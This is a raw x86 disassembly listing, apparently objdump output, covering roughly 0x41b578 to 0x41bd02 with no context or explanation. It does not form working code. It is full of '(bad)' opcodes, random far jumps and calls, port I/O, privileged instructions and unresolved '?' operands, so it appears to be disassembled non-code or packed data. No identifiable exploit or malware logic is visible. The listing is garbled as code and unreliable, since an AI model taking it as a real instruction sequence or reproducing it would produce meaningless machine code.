  41b578:	jmp    0x4a29:0x9bb8314b
  41b57f:	ss pop ebp
  41b581:	(bad)  
  41b583:	pop    esp
  41b584:	sub    DWORD PTR [eax],0x8d9e6d50
  41b58a:	sti    
  41b58b:	mov    ecx,0x1f3d1fc4
  41b590:	lock xor bh,BYTE PTR [esi]
  41b593:	nop
  41b594:	repz sbb dh,0x88
  41b598:	mov    dh,0xd0
  41b59a:	pop    edi
  41b59b:	ds (bad) 
  41b59d:	adc    eax,0xcee8390e
  41b5a2:	stos   BYTE PTR es:[edi],al
  41b5a3:	repnz add dh,BYTE PTR [ebp-0x3f]
  41b5a7:	cli    
  41b5a8:	dec    ebp
  41b5a9:	push   eax
  41b5aa:	push   0xbdf9c2a3
  41b5af:	pop    edi
  41b5b0:	shl    cl,cl
  41b5b2:	jg     0x41b5ad
  41b5b4:	ret    
  41b5b5:	je     0x41b5bd
  41b5b7:	xor    ebx,edi
  41b5b9:	cmp    ah,BYTE PTR [ecx+0x7c]
  41b5bc:	aaa    
  41b5bd:	and    ch,ah
  41b5bf:	gs push ebx
  41b5c1:	xchg   ebx,eax
  41b5c2:	dec    ebp
  41b5c3:	sbb    bl,BYTE PTR [eax]
  41b5c5:	mov    esi,0x26216c17
  41b5ca:	and    BYTE PTR [esi+0x42be2351],dl
  41b5d0:	sub    ah,cl
  41b5d2:	mov    ebx,0xf0009899
  41b5d7:	jge    0x41b563
  41b5d9:	and    BYTE PTR [edx+0x43],cl
  41b5dc:	push   ds
  41b5dd:	mov    ch,0xc5
  41b5df:	sbb    DWORD PTR [edx+0x4],0x3d
  41b5e3:	xchg   ecx,eax
  41b5e4:	mov    esi,0x4892422d
  41b5e9:	ja     0x41b655
  41b5eb:	sub    dh,BYTE PTR [ebx-0x5ad4617d]
  41b5f1:	push   0xffffffad
  41b5f3:	pop    eax
  41b5f4:	stos   BYTE PTR es:[edi],al
  41b5f5:	out    0xfe,al
  41b5f7:	retf   
  41b5f8:	sbb    BYTE PTR [edx+0x3eeeae8d],dl
  41b5fe:	mov    ecx,0x82260e29
  41b603:	std    
  41b604:	inc    esp
  41b605:	cs jmp 0x41b649
  41b608:	mov    dh,0xc5
  41b60a:	rcr    dl,0x9c
  41b60d:	fild   QWORD PTR [esp+edi*8+0x66]
  41b611:	pop    ebx
  41b612:	pop    ss
  41b613:	daa    
  41b614:	or     BYTE PTR [ebx-0x3c],dl
  41b617:	cmp    al,cl
  41b619:	out    0xee,eax
  41b61b:	xor    eax,0x968927fe
  41b620:	pushf  
  41b621:	stos   DWORD PTR es:[edi],eax
  41b622:	inc    esi
  41b623:	cmp    bh,ch
  41b625:	pop    ds
  41b626:	mov    ah,0xe1
  41b628:	mov    ah,0xc8
  41b62a:	mov    ds:0xe6489484,al
  41b62f:	and    BYTE PTR [edi+0x3],ah
  41b632:	mov    ebx,0x591d1d68
  41b637:	pop    ebp
  41b638:	push   esi
  41b639:	or     edx,DWORD PTR [ebp+0x3dbc1b9f]
  41b63f:	pop    esi
  41b640:	rcr    DWORD PTR [edx+eiz*1+0x7ea063fe],0x74
  41b648:	xchg   esi,eax
  41b649:	cdq    
  41b64a:	mov    eax,ds:0xabd847c
  41b64f:	sub    cl,0xce
  41b652:	xchg   ebx,eax
  41b653:	je     0x41b5eb
  41b655:	mov    esp,ss
  41b657:	imul   esp,ebx,0xffffffb7
  41b65a:	addr16 out 0xbe,al
  41b65d:	mov    edi,0x42a44489
  41b662:	fistp  QWORD PTR [ebp-0x2c8d3c34]
  41b668:	out    0xda,al
  41b66a:	enter  0x763a,0x7d
  41b66e:	aad    0x12
  41b670:	add    eax,0xef1b12c0
  41b675:	cmc    
  41b676:	sub    esp,DWORD PTR [edi-0x64]
  41b679:	xchg   edx,eax
  41b67a:	xor    al,0x63
  41b67c:	daa    
  41b67d:	add    al,0xdc
  41b67f:	adc    al,0x25
  41b681:	or     eax,0xd776ad62
  41b686:	push   edi
  41b687:	fs clc 
  41b689:	cmp    BYTE PTR [ebx],ch
  41b68b:	sub    al,0xee
  41b68d:	sbb    BYTE PTR [edi+0x22],dl
  41b690:	xor    al,0xe5
  41b692:	and    BYTE PTR [eax+ebp*1+0x34],dh
  41b696:	mov    esi,0x63f116c4
  41b69b:	pop    ebp
  41b69c:	(bad)  
  41b69d:	mov    ds:0x8b4a312f,al
  41b6a2:	or     DWORD PTR [ebx+0x60a49ee4],esp
  41b6a8:	retf   
  41b6a9:	pop    edi
  41b6aa:	stc    
  41b6ab:	push   es
  41b6ac:	xor    cl,dl
  41b6ae:	add    al,0x3f
  41b6b0:	out    dx,al
  41b6b1:	and    bh,BYTE PTR [ecx+eax*1+0x64]
  41b6b5:	retf   0x67c1
  41b6b8:	xchg   ebx,eax
  41b6b9:	pop    ebx
  41b6ba:	or     eax,edx
  41b6bc:	adc    DWORD PTR [edi-0x3],0xffffff86
  41b6c0:	mov    ecx,0xd8c1d9b
  41b6c5:	shl    BYTE PTR [ebp+0x7b],1
  41b6c8:	int3   
  41b6c9:	into   
  41b6ca:	in     eax,0x94
  41b6cc:	scas   al,BYTE PTR es:[edi]
  41b6cd:	outs   dx,BYTE PTR ds:[esi]
  41b6ce:	pop    edx
  41b6cf:	adc    al,0x8b
  41b6d1:	out    0x91,al
  41b6d3:	pop    ecx
  41b6d4:	ret    0x5d02
  41b6d7:	leave  
  41b6d8:	(bad)  
  41b6d9:	icebp  
  41b6da:	add    esp,ecx
  41b6dc:	clc    
  41b6dd:	call   0x91a2:0x436e9a55
  41b6e4:	lods   eax,DWORD PTR ds:[esi]
  41b6e5:	mov    esi,0x69b2914
  41b6ea:	cld    
  41b6eb:	pop    ebp
  41b6ec:	mov    ebp,0x499e2395
  41b6f1:	mul    DWORD PTR [edi+ebx*4+0x4b]
  41b6f5:	sbb    dl,bl
  41b6f7:	shl    BYTE PTR ds:0x49b65a85,cl
  41b6fd:	jmp    0xdb67:0xceb3571a
  41b704:	cmp    ebx,ebx
  41b706:	dec    esi
  41b707:	push   0xffffffef
  41b709:	push   edx
  41b70a:	retf   0x4c84
  41b70d:	sahf   
  41b70e:	mov    esp,ss
  41b710:	repz in al,0xf
  41b713:	jl     0x41b6cc
  41b715:	and    eax,DWORD PTR [ecx+0xe5c18db]
  41b71b:	push   ebp
  41b71c:	sbb    bl,BYTE PTR [esi+eax*1+0x23]
  41b720:	fcomp  st(3)
  41b722:	add    DWORD PTR [esi+0x60477f2f],eax
  41b728:	push   ds
  41b729:	jo     0x41b6dd
  41b72b:	fs loop 0x41b70b
  41b72e:	push   esi
  41b72f:	icebp  
  41b730:	pop    ebp
  41b731:	pop    ecx
  41b732:	jne    0x41b7a0
  41b734:	push   edx
  41b735:	je     0x41b73c
  41b737:	mov    eax,es
  41b739:	sub    al,0xb0
  41b73b:	rcr    esi,1
  41b73d:	loop   0x41b799
  41b73f:	xor    DWORD PTR [edi+0x5a],edi
  41b742:	xor    DWORD PTR [ecx+0x76],ebx
  41b745:	mov    ds:0x72aa4b67,al
  41b74a:	push   es
  41b74b:	sub    BYTE PTR [eax+eax*4-0x545582bc],bl
  41b752:	popf   
  41b753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b754:	test   DWORD PTR [edi+0x242199d3],0xaee7f11
  41b75e:	xchg   esi,eax
  41b75f:	aas    
  41b760:	xor    esi,DWORD PTR [edx]
  41b762:	(bad)  
  41b763:	cmp    DWORD PTR [ebp+0x3c215efd],ebp
  41b769:	mov    dh,0x7
  41b76b:	push   0x60
  41b76d:	mov    ds:0x485c0718,eax
  41b772:	or     al,0x1c
  41b774:	add    dh,ch
  41b776:	es add eax,0xa9d16fed
  41b77c:	mov    dl,0x23
  41b77e:	jmp    0xc315:0xbb3990e0
  41b785:	push   esi
  41b786:	cli    
  41b787:	cmp    ch,BYTE PTR ds:0x4447c32d
  41b78d:	xchg   ebp,eax
  41b78e:	lock jbe 0x41b716
  41b791:	fs mov ecx,0x8f30ee0a
  41b797:	out    dx,eax
  41b798:	bound  edx,QWORD PTR [ebx]
  41b79a:	jb     0x41b736
  41b79c:	std    
  41b79d:	push   eax
  41b79e:	mov    BYTE PTR [eax],al
  41b7a0:	iret   
  41b7a1:	xor    di,WORD PTR [edi+0x2e]
  41b7a5:	ds xor edi,ebx
  41b7a8:	jo     0x41b79a
  41b7aa:	jns    0x41b80f
  41b7ac:	ror    BYTE PTR [eax+ecx*1],1
  41b7af:	push   bx
  41b7b1:	call   FWORD PTR [esi]
  41b7b3:	inc    esi
  41b7b4:	ds int3 
  41b7b6:	ins    DWORD PTR es:[edi],dx
  41b7b7:	jle    0x41b7b6
  41b7b9:	fistp  WORD PTR [edi-0xad6d071]
  41b7bf:	adc    BYTE PTR [ecx+0x6],ch
  41b7c2:	outs   dx,DWORD PTR ds:[esi]
  41b7c3:	fwait
  41b7c4:	shr    dl,0x12
  41b7c7:	pop    edi
  41b7c8:	mov    al,ds:0x27b84177
  41b7cd:	dec    edi
  41b7ce:	or     ebp,DWORD PTR [esi+edx*4-0x1c2eb76a]
  41b7d5:	(bad)
  41b7d8:	adc    BYTE PTR [eax-0x11],bh
  41b7db:	and    dh,BYTE PTR [ebp+0x5e9ccbda]
  41b7e1:	adc    al,0x8
  41b7e3:	sbb    al,BYTE PTR cs:[ebp+0x47ab3be8]
  41b7ea:	jo     0x41b827
  41b7ec:	loope  0x41b801
  41b7ee:	cmp    DWORD PTR [edx],esp
  41b7f0:	fcmovb st,st(3)
  41b7f2:	inc    ebp
  41b7f3:	fucomp st(3)
  41b7f5:	enter  0x12e7,0xd0
  41b7f9:	std    
  41b7fa:	int    0xbc
  41b7fc:	or     DWORD PTR [edx],ecx
  41b7fe:	shl    DWORD PTR [esi+0x37],1
  41b801:	inc    bp
  41b803:	adc    ecx,edi
  41b805:	mov    esp,0xe7ef3367
  41b80a:	pop    es
  41b80b:	jmp    0x511cdc34
  41b810:	mov    ebp,0xef52c8c
  41b815:	data16 stos BYTE PTR es:[edi],al
  41b817:	jae    0x41b844
  41b819:	jmp    0xab83:0xddf74681
  41b820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b821:	dec    esi
  41b822:	inc    edi
  41b823:	cmp    dh,BYTE PTR [edi-0x4b]
  41b826:	div    DWORD PTR [edi-0x73aeeb0d]
  41b82c:	xor    bh,ch
  41b82e:	push   eax
  41b82f:	mov    ch,0x53
  41b831:	push   ecx
  41b832:	adc    bh,BYTE PTR [edx]
  41b834:	sub    ebp,DWORD PTR [ecx+0x2a0e3e91]
  41b83a:	sub    al,0x57
  41b83c:	ret    
  41b83d:	or     DWORD PTR [edx-0x9],esi
  41b840:	in     al,dx
  41b841:	mov    dl,0x34
  41b843:	loop   0x41b7d0
  41b845:	jmp    0x4e8bcea6
  41b84a:	or     BYTE PTR [edx-0x60ff9360],cl
  41b850:	mov    esp,0xa01bf40f
  41b855:	mov    ah,0xec
  41b857:	lods   eax,DWORD PTR ds:[esi]
  41b858:	ret    0x76a5
  41b85b:	mov    WORD PTR [ebx+edx*2],ss
  41b85e:	enter  0x807d,0x42
  41b862:	mov    esi,ebp
  41b864:	pop    ss
  41b865:	pop    ecx
  41b866:	pop    esi
  41b867:	sub    ch,cl
  41b869:	push   eax
  41b86a:	ins    BYTE PTR es:[edi],dx
  41b86b:	je     0x41b814
  41b86d:	mov    esp,0x7d3b69bb
  41b872:	adc    dl,BYTE PTR [ebp-0x7f6243d9]
  41b878:	(bad)  
  41b879:	fild   QWORD PTR [edi-0x39]
  41b87c:	(bad)  
  41b87d:	pushf  
  41b87e:	xchg   ecx,eax
  41b87f:	dec    esp
  41b880:	mov    eax,0x3b07ab13
  41b885:	clc    
  41b886:	mov    WORD PTR gs:[ebp-0x55],gs
  41b88a:	and    al,0xd0
  41b88c:	push   ecx
  41b88d:	xor    DWORD PTR [ecx],esp
  41b88f:	mov    bl,0x51
  41b891:	js     0x41b813
  41b893:	sub    DWORD PTR [ebp+0x744b9f8c],edi
  41b899:	and    DWORD PTR ds:[ecx],esp
  41b89c:	retf   0x99b4
  41b89f:	mov    ds:0xdd345192,eax
  41b8a4:	xor    eax,0xc322fa56
  41b8a9:	into   
  41b8aa:	outs   dx,BYTE PTR ds:[esi]
  41b8ab:	ret    
  41b8ac:	xchg   BYTE PTR [ecx-0x50eb4778],bl
  41b8b2:	xchg   BYTE PTR [ebx-0x4],bh
  41b8b5:	push   cs
  41b8b6:	fdivr  DWORD PTR [ebp-0x8b38240]
  41b8bc:	loope  0x41b927
  41b8be:	cmp    eax,DWORD PTR [ebx-0x38ced801]
  41b8c4:	cli    
  41b8c5:	jnp    0x41b8d2
  41b8c7:	mov    BYTE PTR [eax+edx*8-0x69],0x4b
  41b8cc:	mov    ds:0xd2d64de5,eax
  41b8d1:	mov    ch,0x50
  41b8d3:	jl     0x41b931
  41b8d5:	cdq    
  41b8d6:	mov    esi,0x885a37b5
  41b8db:	mov    DWORD PTR [ebp+esi*8-0x2],edx
  41b8df:	std    
  41b8e0:	sar    BYTE PTR [edi+0x46710074],cl
  41b8e6:	cmp    DWORD PTR [eax-0x40738f35],edi
  41b8ec:	sub    DWORD PTR [esi+0x66],edx
  41b8ef:	shl    BYTE PTR [esi],1
  41b8f1:	fdivr  DWORD PTR [ebx+0x44]
  41b8f4:	imul   ecx,ebp,0x5d9e8ecd
  41b8fa:	mov    cs:0x3db5fbb6,al
  41b900:	adc    BYTE PTR [ebx-0x1527ef90],0x13
  41b907:	cmc    
  41b908:	mov    esi,0x4c6c6146
  41b90d:	es out dx,al
  41b90f:	ret    
  41b910:	aas    
  41b911:	in     eax,dx
  41b912:	inc    esp
  41b913:	loope  0x41b8a5
  41b915:	lds    edx,FWORD PTR [edx]
  41b917:	cmp    ch,BYTE PTR [eax+ebp*1-0x14]
  41b91b:	add    al,0xdd
  41b91d:	test   cl,bh
  41b91f:	cmp    BYTE PTR [eax+0x3f],dh
  41b922:	popa   
  41b923:	repnz push ebx
  41b925:	aam    0x81
  41b927:	xchg   ebp,eax
  41b928:	xchg   bl,ch
  41b92a:	jecxz  0x41b989
  41b92c:	ds cdq 
  41b92e:	test   bh,cl
  41b930:	test   BYTE PTR [esp+eax*4],bl
  41b933:	aam    0x33
  41b935:	sar    BYTE PTR [esi+0x4ab0dac9],cl
  41b93b:	xchg   ecx,eax
  41b93c:	inc    esp
  41b93d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41b93f:	jo     0x41b999
  41b941:	shl    BYTE PTR [edi-0x406c6339],0x7e
  41b948:	mov    ebx,0xce36add9
  41b94d:	sub    dh,BYTE PTR [eax-0x3ded2fe8]
  41b953:	es test BYTE PTR gs:[edx-0x5c874cc4],ch
  41b95b:	data16 xchg ch,dl
  41b95e:	ins    DWORD PTR es:[edi],dx
  41b95f:	push   0xffffff91
  41b961:	aad    0x70
  41b963:	xor    DWORD PTR [esi-0x60574557],esp
  41b969:	adc    DWORD PTR ds:0xf988af6c,esi
  41b96f:	mov    ebp,0x87a8245a
  41b974:	loop   0x41b91c
  41b976:	mov    ebx,0xd5c06e7b
  41b97b:	xor    al,0x32
  41b97d:	mov    ch,0x14
  41b97f:	scas   al,BYTE PTR es:[edi]
  41b980:	cmp    eax,0x32feb29a
  41b985:	jbe    0x41b9d4
  41b987:	pop    ebp
  41b988:	push   esp
  41b989:	mov    al,BYTE PTR [eax-0x6059dfb4]
  41b98f:	push   0x53
  41b991:	int3   
  41b992:	and    al,0x97
  41b994:	aad    0x31
  41b996:	xor    bl,bl
  41b998:	loope  0x41b93a
  41b99a:	adc    esp,DWORD PTR [eax-0x799558b1]
  41b9a0:	ret    0xb700
  41b9a3:	adc    ebx,DWORD PTR [edi]
  41b9a5:	jb     0x41b9ed
  41b9a7:	dec    ebp
  41b9a8:	stos   BYTE PTR es:[edi],al
  41b9a9:	cmp    al,0xb1
  41b9ab:	or     BYTE PTR [eax-0x7102e0be],bh
  41b9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9b2:	and    al,0x2
  41b9b4:	xor    BYTE PTR [ebx+0x47],bh
  41b9b7:	dec    esi
  41b9b8:	test   BYTE PTR [eax+0x44],ch
  41b9bb:	clc    
  41b9bc:	mov    ss,WORD PTR [ecx-0x5d]
  41b9bf:	add    BYTE PTR [ebx],ch
  41b9c1:	dec    edx
  41b9c2:	ficom  WORD PTR [edx+0x59]
  41b9c5:	sub    DWORD PTR [ebp+0x76],edx
  41b9c8:	mov    eax,ds:0xf917bbc5
  41b9cd:	or     eax,0x83f87f1f
  41b9d2:	adc    eax,0xd3848cf0
  41b9d7:	pusha  
  41b9d8:	xchg   ecx,eax
  41b9d9:	sbb    ch,BYTE PTR [ecx]
  41b9db:	inc    esi
  41b9dc:	enter  0xf686,0x51
  41b9e0:	shl    DWORD PTR [ecx+0x2e67397a],0x87
  41b9e7:	daa    
  41b9e8:	(bad)  
  41b9e9:	rcl    DWORD PTR [ebp+0xfdb6dbc],cl
  41b9ef:	int    0xa2
  41b9f1:	pop    esi
  41b9f2:	in     eax,0xfa
  41b9f4:	mov    ecx,0x4505d5e9
  41b9f9:	loop   0x41b9e0
  41b9fb:	xchg   ebp,eax
  41b9fc:	int    0xb5
  41b9fe:	addr16 push ds
  41ba00:	lahf   
  41ba01:	or     BYTE PTR [esi+0x65],dh
  41ba04:	push   esi
  41ba05:	enter  0x72fe,0x90
  41ba09:	mov    cl,0xb3
  41ba0b:	test   DWORD PTR ds:0x8cd506b8,esp
  41ba11:	jns    0x41b9a9
  41ba13:	int    0x4
  41ba15:	cwde   
  41ba16:	inc    edx
  41ba17:	push   es
  41ba18:	mov    eax,ds:0xbb374d6f
  41ba1d:	pop    es
  41ba1e:	enter  0xd197,0x52
  41ba22:	mov    ds:0x44e7daba,al
  41ba27:	cmp    ebx,0x5a
  41ba2a:	int3   
  41ba2b:	call   FWORD PTR [ebp-0x17]
  41ba2e:	sub    bl,BYTE PTR ds:0xc64ba5f2
  41ba34:	pop    ebx
  41ba35:	idiv   BYTE PTR [ecx+0x3917f5ef]
  41ba3b:	jmp    0xf49a1e8a
  41ba40:	or     esi,esp
  41ba42:	scas   eax,DWORD PTR es:[edi]
  41ba43:	bound  ebx,QWORD PTR [ebp+0x14563eef]
  41ba49:	(bad)  
  41ba4b:	pop    ecx
  41ba4c:	repz and eax,0x2ec9ee43
  41ba52:	lods   al,BYTE PTR ds:[esi]
  41ba53:	xor    edx,edi
  41ba55:	lock lods al,BYTE PTR ds:[esi]
  41ba57:	int3   
  41ba58:	jl     0x41ba54
  41ba5a:	out    dx,eax
  41ba5b:	jno    0x41b9f5
  41ba5d:	dec    esp
  41ba5e:	mov    ebp,0xb961616a
  41ba63:	pop    ds
  41ba64:	jg     0x41ba19
  41ba66:	xchg   esi,eax
  41ba67:	or     bl,BYTE PTR [ecx+0x5937a2af]
  41ba6d:	int3   
  41ba6e:	ds mov ah,0xcb
  41ba71:	cmp    al,0xfe
  41ba73:	rcr    DWORD PTR [edi+eiz*2-0x6a],cl
  41ba77:	pop    ebx
  41ba78:	push   esp
  41ba79:	sbb    eax,edx
  41ba7b:	(bad)  
  41ba7c:	or     edx,DWORD PTR [eax+0x15]
  41ba7f:	loope  0x41bad0
  41ba81:	push   ebx
  41ba82:	shr    BYTE PTR ss:[ecx-0x5c],cl
  41ba86:	pop    ebp
  41ba87:	popf   
  41ba88:	inc    edx
  41ba89:	call   0x91e0:0x9892ab3a
  41ba90:	imul   ebp,ebx,0xcc88a581
  41ba96:	inc    edi
  41ba97:	fistp  WORD PTR [eax]
  41ba99:	inc    DWORD PTR [edi+esi*4-0x59529748]
  41baa0:	add    ah,BYTE PTR [eax]
  41baa2:	sub    ebp,DWORD PTR ds:0xeb35a67e
  41baa8:	das    
  41baa9:	mov    eax,es:0xa55ff61f
  41baaf:	mov    es,eax
  41bab1:	dec    ebp
  41bab2:	jecxz  0x41ba51
  41bab4:	jbe    0x41bacd
  41bab6:	stc    
  41bab7:	dec    edx
  41bab8:	(bad)  
  41bab9:	xlat   BYTE PTR ds:[ebx]
  41baba:	sbb    eax,0x77bdf346
  41babf:	aam    0x83
  41bac1:	shl    bh,1
  41bac3:	add    dh,BYTE PTR [eax+ecx*1-0x51ed43ce]
  41baca:	jo     0x41bab0
  41bacc:	outs   dx,BYTE PTR ds:[esi]
  41bacd:	xlat   BYTE PTR ds:[ebx]
  41bace:	push   0x956950a5
  41bad3:	add    al,0xfc
  41bad5:	enter  0x6b67,0x22
  41bad9:	fdiv   DWORD PTR [ecx]
  41badb:	test   DWORD PTR [ebp+0x4b9a750b],edx
  41bae1:	sbb    al,0x21
  41bae3:	lahf   
  41bae4:	inc    edx
  41bae5:	ret    0x7ca9
  41bae8:	nop
  41bae9:	mov    al,ds:0x8f9884f5
  41baee:	stc    
  41baef:	mov    ds:0x7dedceab,al
  41baf4:	cli    
  41baf5:	sub    cl,BYTE PTR [ebp-0x7c]
  41baf8:	mov    ?,WORD PTR [edi+0x3db555f7]
  41bafe:	retf   
  41baff:	outs   dx,BYTE PTR ds:[esi]
  41bb00:	(bad)  
  41bb01:	jne    0x41bb32
  41bb03:	fs ins BYTE PTR es:[edi],dx
  41bb05:	sbb    BYTE PTR [ebp-0x1b],cl
  41bb08:	ret    
  41bb09:	aad    0x1b
  41bb0b:	fnstenv [ebx]
  41bb0d:	xor    eax,0xb8e89e7b
  41bb12:	mov    ebp,0x421999df
  41bb17:	sub    eax,0x8ef0b604
  41bb1c:	into   
  41bb1d:	push   DWORD PTR [ecx-0x6b]
  41bb20:	xchg   DWORD PTR [edx-0x4cd8f458],edi
  41bb26:	push   ebp
  41bb27:	cs push esp
  41bb29:	jnp    0x41bb58
  41bb2b:	fstp   QWORD PTR [edi+edi*4+0x40]
  41bb2f:	sbb    bl,bh
  41bb31:	dec    edx
  41bb32:	push   0xfffffff8
  41bb34:	imul   ecx,DWORD PTR [edx],0x374a0a68
  41bb3a:	jp     0x41bb29
  41bb3c:	inc    ebx
  41bb3d:	fdivr  QWORD PTR [edx]
  41bb3f:	cs pushf 
  41bb41:	mov    cl,0x3f
  41bb43:	rol    BYTE PTR [ebx-0x3a],1
  41bb46:	fstp   QWORD PTR ds:0xd2be4450
  41bb4c:	jo     0x41bad5
  41bb4e:	push   eax
  41bb4f:	ins    DWORD PTR es:[edi],dx
  41bb50:	out    dx,eax
  41bb51:	stos   DWORD PTR es:[edi],eax
  41bb52:	ret    
  41bb53:	xchg   esp,eax
  41bb54:	out    0xa2,al
  41bb56:	ret    0xeadb
  41bb59:	lock mov cl,0x8
  41bb5c:	arpl   WORD PTR [ebx-0x71],sp
  41bb5f:	(bad)  
  41bb60:	ficomp WORD PTR [esi+eiz*1+0xcafd6d9]
  41bb67:	jg     0x41bb1b
  41bb69:	add    DWORD PTR [ebp-0x247f6d4f],ebx
  41bb6f:	out    0x1f,al
  41bb71:	cmp    bl,0x90
  41bb74:	jge    0x41bbd9
  41bb76:	inc    edx
  41bb77:	aaa    
  41bb78:	inc    ebp
  41bb79:	loopne 0x41bbe2
  41bb7b:	fwait
  41bb7c:	into   
  41bb7d:	push   ebp
  41bb7e:	inc    esi
  41bb7f:	dec    ebp
  41bb80:	dec    edi
  41bb81:	fidiv  DWORD PTR [ebx+0x2f1b2c27]
  41bb87:	jecxz  0x41bb19
  41bb89:	jo     0x41bbb5
  41bb8b:	sub    ecx,ecx
  41bb8d:	test   al,0x5e
  41bb8f:	test   DWORD PTR [esi-0x5d],eax
  41bb92:	icebp  
  41bb93:	aad    0x96
  41bb95:	sub    dl,BYTE PTR [ebp-0x33f14b2a]
  41bb9b:	adc    ah,BYTE PTR [edx+edx*2+0x5a68fde]
  41bba2:	adc    eax,DWORD PTR [ebp+0x34]
  41bba5:	push   ebp
  41bba6:	lahf   
  41bba7:	dec    ecx
  41bba8:	ins    BYTE PTR es:[edi],dx
  41bba9:	jno    0x41bb6a
  41bbab:	cmp    al,0xe8
  41bbad:	adc    al,BYTE PTR [esi-0x4a1a7353]
  41bbb3:	std    
  41bbb4:	test   al,0xbd
  41bbb6:	fs dec esi
  41bbb8:	add    bh,BYTE PTR [ebp-0x76]
  41bbbb:	adc    edx,DWORD PTR [ecx-0x1e93581f]
  41bbc1:	jmp    0x41bbe5
  41bbc3:	and    edx,DWORD PTR [ebp+0x32]
  41bbc6:	in     al,dx
  41bbc7:	fmul   QWORD PTR [edx+0x7f]
  41bbca:	sub    ah,BYTE PTR [edx+0x385f4d2c]
  41bbd0:	and    BYTE PTR [edi+edx*8],dh
  41bbd3:	dec    edi
  41bbd4:	int    0xa4
  41bbd6:	js     0x41bc07
  41bbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbd9:	call   0xed310a29
  41bbde:	mov    edx,0xf49994ea
  41bbe3:	(bad)  
  41bbe4:	jmp    0x314e:0x7a21cf9b
  41bbeb:	repnz or BYTE PTR [ebp+0x7c],ch
  41bbef:	and    DWORD PTR [eax-0x5b9ddc2],ebp
  41bbf5:	rcr    DWORD PTR [eax-0x1a],0x87
  41bbf9:	pop    esp
  41bbfa:	leave  
  41bbfb:	lahf   
  41bbfc:	dec    ebp
  41bbfd:	mov    bh,0x15
  41bbff:	ins    BYTE PTR es:[edi],dx
  41bc00:	pop    es
  41bc01:	outs   dx,DWORD PTR ds:[esi]
  41bc02:	jl     0x41bc26
  41bc04:	xchg   ebp,eax
  41bc05:	xchg   DWORD PTR [eax+0x514ffd58],esi
  41bc0b:	sub    DWORD PTR [edx],ebp
  41bc0d:	fsubr  st(6),st
  41bc0f:	push   esi
  41bc10:	fisttp QWORD PTR [eax]
  41bc12:	jecxz  0x41bb9e
  41bc14:	jne    0x41bc8a
  41bc16:	pop    ebp
  41bc17:	adc    eax,0x616e5398
  41bc1c:	imul   ecx,DWORD PTR [ecx-0x1c23734c],0x31
  41bc23:	in     eax,0x17
  41bc25:	ror    edi,1
  41bc27:	mov    ch,0x7e
  41bc29:	jb     0x41bc94
  41bc2b:	inc    ebp
  41bc2c:	jle    0x41bca3
  41bc2e:	test   ah,ah
  41bc30:	fisub  DWORD PTR [eax+0x74]
  41bc33:	jecxz  0x41bbba
  41bc35:	pop    eax
  41bc36:	inc    edi
  41bc37:	call   0x4add6a8e
  41bc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc3d:	cmp    BYTE PTR [edi-0x2787d5ae],ch
  41bc43:	dec    ecx
  41bc45:	(bad)  
  41bc46:	(bad)  
  41bc47:	jb     0x41bc9d
  41bc49:	mov    cl,0x61
  41bc4b:	int3   
  41bc4c:	sbb    BYTE PTR [esi],0xd3
  41bc4f:	scas   al,BYTE PTR es:[edi]
  41bc50:	hlt    
  41bc51:	mov    ds:0x9a9961fe,eax
  41bc56:	inc    edx
  41bc57:	dec    esi
  41bc58:	retf   
  41bc59:	xor    al,0xe6
  41bc5b:	jp     0x41bc15
  41bc5d:	scas   al,BYTE PTR es:[edi]
  41bc5e:	adc    bh,ch
  41bc60:	arpl   WORD PTR [ecx+0x1c],dx
  41bc63:	mov    al,0xdf
  41bc65:	pop    esi
  41bc66:	sbb    BYTE PTR [ebx],bl
  41bc68:	or     dh,al
  41bc6a:	mov    ecx,?
  41bc6c:	or     eax,0xdb28f27c
  41bc71:	mov    esi,edi
  41bc73:	sub    ebp,DWORD PTR [edx-0x73]
  41bc76:	rcl    BYTE PTR [ebp+0x3a],0x7c
  41bc7a:	mov    ch,0x89
  41bc7c:	push   eax
  41bc7d:	mov    eax,0x645810c3
  41bc82:	into   
  41bc83:	loope  0x41bcd7
  41bc85:	mov    edx,0x2c1c373
  41bc8a:	and    BYTE PTR [esi-0x3d],al
  41bc8d:	fs jge 0x41bc2a
  41bc90:	(bad)
  41bc95:	push   ss
  41bc96:	push   0xe8f391bf
  41bc9b:	fistp  WORD PTR [edi]
  41bc9d:	mov    eax,ds:0x4e3f7aeb
  41bca2:	add    eax,0xba7d97ca
  41bca7:	mov    al,0xcb
  41bca9:	and    BYTE PTR [eax],dh
  41bcab:	mov    ?,esp
  41bcad:	pop    es
  41bcae:	(bad)
  41bcb1:	mul    DWORD PTR [ebx]
  41bcb3:	(bad)  
  41bcb4:	push   ebx
  41bcb5:	sahf   
  41bcb6:	push   edi
  41bcb7:	dec    esp
  41bcb8:	add    al,0x86
  41bcba:	fs jo  0x41bcdf
  41bcbd:	nop
  41bcbe:	jle    0x41bc56
  41bcc0:	push   ebx
  41bcc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcc2:	adc    esp,DWORD PTR [eax-0x37]
  41bcc5:	cld    
  41bcc6:	sub    edx,esi
  41bcc8:	(bad)  
  41bcc9:	inc    esi
  41bcca:	xor    edi,DWORD PTR [edx]
  41bccc:	into   
  41bccd:	and    BYTE PTR [ecx-0x431d31ce],bl
  41bcd3:	test   DWORD PTR [eax],ebp
  41bcd5:	in     al,dx
  41bcd6:	sbb    DWORD PTR [ebp+0x2f081173],eax
  41bcdc:	dec    eax
  41bcdd:	lods   al,BYTE PTR ds:[esi]
  41bcde:	daa    
  41bcdf:	cmc    
  41bce0:	jns    0x41bcbe
  41bce2:	and    BYTE PTR [esi+0x1f1c1be0],cl
  41bce8:	sub    esp,eax
  41bcea:	es push 0xffffffe6
  41bced:	fimul  WORD PTR [ebp+0x30]
  41bcf0:	ss cmp ah,bl
  41bcf3:	dec    esi
  41bcf4:	jl     0x41bc93
  41bcf6:	cmovb  esp,DWORD PTR [edx]
  41bcf9:	(bad)  
  41bcfa:	adc    eax,DWORD PTR [ebx+0x3b]
  41bcfd:	outs   dx,BYTE PTR ds:[esi]
  41bcfe:	out    0x9b,eax
  41bd00:	jg     0x41bd74
  41bd02:	rcr    BYTE PTR [edi+eax*4-0x2eb36474],0xcc
